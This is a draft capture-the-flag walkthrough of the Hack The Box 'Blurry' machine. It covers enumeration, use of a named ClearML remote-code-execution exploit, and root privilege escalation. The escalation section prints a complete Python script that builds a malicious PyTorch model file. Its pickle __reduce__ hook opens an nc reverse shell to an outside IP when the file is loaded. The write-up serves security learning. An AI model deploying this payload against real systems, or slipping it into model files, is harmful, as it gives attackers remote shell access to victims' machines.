---
title: "Blurry Walkthrough(Hack The Box)"
date: 2025-04-05
draft: true
description: "a description"
tags: ["Medium", "Linux", "Hack The Box", "Hacking", "Web", "Walkthrough"]
---
## Reconnaissance #Linux
- Got two ports open
- ![[Pasted image 20241230011755.png]]
- We got the main app at `app.blurry.htb`
## Enumeration
- Got multiple subdomains
- `files`, `app`, `chat`, `api` 
- ![[Pasted image 20241230012112.png]]
- Learnt about the project in `app` from `chat` announcements.
## Exploitation
- Found a exploit `CVE-2024-24590-ClearML-RCE-Exploit`
- Followed the steps and initiated the clearML on the host 
- Ran the exploit and got the shell
- ![[Pasted image 20241230012804.png]]
- Also got the user flag
- ![[Pasted image 20241230022137.png]]
## Privilege Escalation
- Had a `sudo` priv esc path
- ![[Pasted image 20241230031047.png]]
- This script basically runs and gets a file as input and check whether it is malicious or not.
- I made a program in python using torch. Using this script can get reverse shell as root
- I learned about this vulnerability in the same blog
```python
import torch  
import torch.nn as nn  
import os  
  
class MaliciousModel(nn.Module):  
    def __init__(self):  
        super(MaliciousModel, self).__init__()  
        self.dense = nn.Linear(10, 1)  
      
    def forward(self, pk):  
        return self.dense(pk)  
     
    def __reduce__(self):  
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.65 9001 >/tmp/f"  
        return os.system, (cmd,)  
  
malicious_model = MaliciousModel()  
torch.save(malicious_model, 'pk2212.pth')
```
- Executed the script
- ![[Pasted image 20241230031501.png]]
- Got the root shell and flag
- ![[Pasted image 20241230031533.png]]
